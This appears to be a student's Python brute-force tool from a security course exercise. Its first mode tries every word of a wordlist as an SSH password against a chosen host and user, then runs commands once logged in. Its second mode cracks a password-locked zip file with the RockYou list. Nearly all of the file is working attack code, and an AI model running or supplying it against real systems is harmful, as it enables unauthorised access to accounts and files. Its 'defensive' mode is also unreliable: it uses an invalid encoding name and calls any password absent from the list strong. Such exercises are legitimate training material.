#!/usr/bin/python3


# Script Name: Automated Brute Force Wordlist Tool Pt. 3
# Author: Shay Crane
# Date of last revision: 10/26/2022
# Purpose:  complete the development of the custom brute force tool,
#           adding the option to access a protected zip file. 


# Create a .txt file containing a secret message.

# Follow the guide, How to Protect Zip file with Password, 
#               to archive the .txt file with password protection.

# Next, add a new mode to your Python brute force tool 
#               that allows you to brute force attack a password-locked zip file.

# Use the zipfile library.

# Pass it the RockYou.txt list to test all words 
#               in the list against the password-locked zip file.


#import libraries
import time, getpass, sys
from pexpect import pxssh
import zipfile
from tqdm import tqdm




#define functions
#print menu
def menu():
    print("For Dictionary Iterator (Offensive), enter 1.")
    print("For Password Recognition (Defensive), enter 2.")
    print("To crack a zipped file, enter 3.")
    print("To exit, enter 9.")
    choice=input("Enter your choice: ")

    if choice=="1":
        iterator()
    elif choice=="2":
        password_check()
    elif choice=="3":
        crack_file()
    else: 
        sys.exit 


#iterates user input to access a given system
def iterator():
    host=input("Enter target host IP address: ")
    username=input("Enter target username: ")
    path=input("Enter the filepath to your wordlist:\n ")
    file=open(path,encoding="ISO-8859-1")
    line=file.readline()
    success="no"
    if success=="no":
        while line:
            line=line.rstrip()
            pwd=line
            print(f"Checking '{pwd}'...")
            session=pxssh.pxssh()
            try:
                session.login(host, username, pwd)
                print("\nACCESS GRANTED.")
                session.sendline('uptime')
                session.prompt()
                print(f"the username is: {str(session.before)[12:-5]} the password is: {pwd}")
                print(session.before) #prints everything before the prompt
                session.sendline('whoami')
                session.prompt()
                print((session.before).decode())
                session.sendline("ls -l")
                session.prompt()
                print((session.before).decode())
                session.logout()
                success="yes"
                print("[*] MISSION ACCOMPLISHED. Please wait while I return you to the menu...")
                break

            except pxssh.ExceptionPxssh as e:
                print("Your attempt at login access has failed.")
                print(e)

            except KeyboardInterrupt:
                print("\n\n[*] PROCESS INTERRUPTED.")
                sys.exit()

            time.sleep(.5)
            line=file.readline()

        file.close()

    else: 
        print("[*] MISSION ACCOMPLISHED. Please wait while I return you to the menu...")
        menu()


#access zip file
#thank you to https://www.thepythoncode.com/article/crack-zip-file-password-in-python
#for the helpful online walkthrough of how to make this function work as required
def crack_file():
    # zip_file=input("Enter the absolute path to the zip file you wish to access: ")
    # wordlist=input("Enter the absolute filepath of your wordlist document: ")
    wordlist="/home/shannon/test-folder/rockyou.txt"
    zip_file="/home/shannon/test-folder/secretmsg.zip"
    
    zip_file=zipfile.ZipFile(zip_file)
    wordnums=len(list(open(wordlist, "rb")))
    print("Total number of passwords to try: ", wordnums)

    with open(wordlist,'rb') as wordlist:
        for word in tqdm(wordlist,total=wordnums,unit="word"):
            try:
                zip_file.extractall(pwd=word.strip())
            except:
                continue
            else:
                print("[+] Password found:", word.decode().strip())
                exit(0)
            
    print("[!] Password not found, returning to menu...")
    menu()


#password check
def password_check():
    usrpwrd=getpass.getpass(prompt="Enter your chosen password: ")
    wordlist=input("Enter the file path of your word list document: ")
    print(f"Comparing your entered password against the contents in '{wordlist}'...")
    time.time()
    filetwo=open(wordlist,encoding="ISO-9959-1")
    line=filetwo.readline()
    wordlist=[]
    while line:
        line=line.rstrip()
        word=line
        wordlist.append(word)
        print(wordlist)
        line=filetwo.readline()
    filetwo.close()
    if usrpwrd not in wordlist:
        print("Your password is strong.  Use it!")
    else: 
        print("That password is very common.  Start over and choose another.")
        menu()



#main
#call menu function
menu()